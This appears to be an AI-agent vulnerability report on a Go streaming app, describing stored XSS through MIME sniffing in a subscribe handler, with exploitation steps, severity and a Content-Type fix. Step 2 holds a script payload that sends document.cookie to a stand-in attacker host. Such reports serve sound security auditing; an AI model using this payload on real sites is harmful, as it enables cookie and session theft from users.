---
agent_num: 2
provider: claude
---

## Vulnerability: Stored XSS via Content-Type Sniffing

### Vulnerable Code Location

**Primary:** `main.go:98` — `w.Write(data)` in the `subscribe` handler writes attacker-controlled bytes to the HTTP response without ever setting a `Content-Type` header.

**Enabling code in StationManager subsystem:** `broadcaster.go:92-94` (`b.history = append(b.history, data)`) stores the payload, and `broadcaster.go:127-130` (`Read`) serves it back verbatim to any subscriber.

### Explanation

The `subscribe` handler (`main.go:65-103`) never calls `w.Header().Set("Content-Type", ...)`. When Go's `http.ResponseWriter.Write()` is called for the first time without a Content-Type header, it invokes `http.DetectContentType()` on the data to guess the MIME type. This function implements the WHATWG MIME Sniffing algorithm and returns `text/html; charset=utf-8` if the data begins with HTML signatures such as `<html`, `<script`, `<head`, `<body`, `<br`, `<p`, `<div`, `<!--`, etc.

The Broadcaster's history buffer stores all messages sent to a station and replays them to every new subscriber starting from index 0. An attacker controls the first message (and therefore the content-type sniffing input) for all future subscribers.

### Step-by-Step Exploitation

1. **Create a station:**
   ```
   POST /station?id=music-stream HTTP/1.1
   ```

2. **Broadcast an XSS payload as the first message:**
   ```
   POST /station/broadcast?id=music-stream HTTP/1.1
   Content-Type: application/octet-stream

   <html><script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
   ```
   This is stored in `b.history[0]` via `Broadcaster.Send()` (`broadcaster.go:93`).

3. **Victim opens the listen URL in their browser:**
   ```
   GET /station/listen?id=music-stream
   ```

4. **Server serves the payload.** The subscribe handler calls `b.Read()` which returns `b.history[0]` — the attacker's HTML. This is the first call to `w.Write(data)` (`main.go:98`). Go sniffs the content and sets `Content-Type: text/html; charset=utf-8`.

5. **Browser renders and executes the JavaScript.** The victim's browser sees an HTML response and executes the `<script>` tag. Cookies from the origin, session tokens, and any same-origin data are exfiltrated.

### What the Attacker Gains

- JavaScript execution in any victim's browser session who navigates to the listen endpoint
- Theft of cookies/session tokens for the origin (if the server is co-hosted or reverse-proxied with other services on the same domain)
- Arbitrary DOM manipulation, credential phishing via injected forms, keylogging
- The payload is **persistent** — stored in the history buffer and served to every new subscriber automatically, without the attacker remaining connected

### Severity: **High**

This meets the definition: *"Stored XSS that executes in other users' sessions."* The payload is stored in the Broadcaster's history buffer (part of the StationManager subsystem) and automatically delivered to all future listeners. No special user interaction is needed beyond visiting the listen URL, which is the normal intended use of the application.

### Fix

Set an explicit Content-Type in the subscribe handler before any `Write` call:

```go
w.Header().Set("Content-Type", "application/octet-stream")
```

This prevents Go's content-type sniffing from ever returning `text/html`, ensuring browsers treat the stream as opaque binary data rather than renderable HTML. Alternatively, set `X-Content-Type-Options: nosniff` as defense-in-depth.
